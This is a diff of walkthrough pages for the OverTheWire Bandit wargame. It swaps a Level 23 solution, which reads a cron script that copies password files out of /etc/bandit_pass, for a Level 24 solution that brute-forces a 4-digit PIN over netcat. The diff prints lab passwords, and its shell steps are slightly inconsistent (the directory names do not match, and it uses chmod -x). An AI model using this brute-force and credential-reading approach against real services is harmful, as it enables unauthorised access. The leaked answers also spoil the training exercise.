@@ -1,14 +1,16 @@
-<h1>Bandit 23</h1>
+<h1>Bandit 24</h1>
 
 <h2 id="level-goal">Level Goal</h2>
 <p>A program is running automatically at regular intervals from
 <strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for
 the configuration and see what command is being executed.</p>
 
-<p><strong>NOTE:</strong> Looking at shell scripts written by other people is a
-very useful skill. The script for this level is intentionally made
-easy to read. If you are having problems understanding what it does,
-try executing it to see the debug information it prints.</p>
+<p><strong>NOTE:</strong> This level requires you to create your own first
+shell-script. This is a very big step and you should be proud of
+yourself when you beat this level!</p>
+
+<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once
+executed, so you may want to keep a copy around…</p>
 
 <h2 id="commands-you-may-need-to-solve-this-level">Commands you may need to solve this level</h2>
 <p>cron, crontab, crontab(5) (use “man 5 crontab” to access this)</p>
@@ -17,32 +19,42 @@ try executing it to see the debug information it prints.</p>
 <h1>Solution</h1>
 
 ```
-user@host:~$ ssh bandit22@bandit.labs.overthewire.org -p 2220
-Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+user@host:~$ ssh bandit24@bandit.labs.overthewire.org -p 2220
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
-bandit22@bandit:~$ ls /etc/cron.d/
-cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
-cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
-bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
-@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
-* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
-bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
-#!/bin/bash
-
-myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
-
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
-
-cat /etc/bandit_pass/$myname > /tmp/$mytarget
-bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh
-Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
-bandit22@bandit:~$ cat /tmp/8169b67bd894ddbb4412f91573b38db3
-Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
-bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
-8ca319486bfbbc3663ea0fbe81326349
-bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1111
+Wrong! Please enter the correct pincode. Try again.
+^C
 ```
 
-<a href="bandit22.md">Level 22</a>             <a href="bandit24.md">Level 24</a>
+Let's make a script that automatically tries all combinations.
+
+```
+bandit24@bandit:~$ mkdir /tmp/scripts/
+bandit24@bandit:~$ vim /tmp/myscripts/runme.sh
+  1 #!/bin/bash
+  2 for i in {0000..9999}; do
+  3     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/myscripts/combinations.txt
+  4 done
+bandit24@bandit:~$ chmod -x /tmp/myscripts/runme.sh
+bandit24@bandit:~$ touch /tmp/myscripts/combinations.txt
+bandit24@bandit:~$ ls /tmp/myscripts/
+combinations.txt  runme.sh
+bandit24@bandit:~$ bash /tmp/myscripts/runme.sh
+bandit24@bandit:~$ cat /tmp/myscripts/combinations.txt | nc localhost 30002
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+...
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
+
+<a href="bandit23.md">Level 23</a>
+<a href="bandit25.md">Level 25</a>
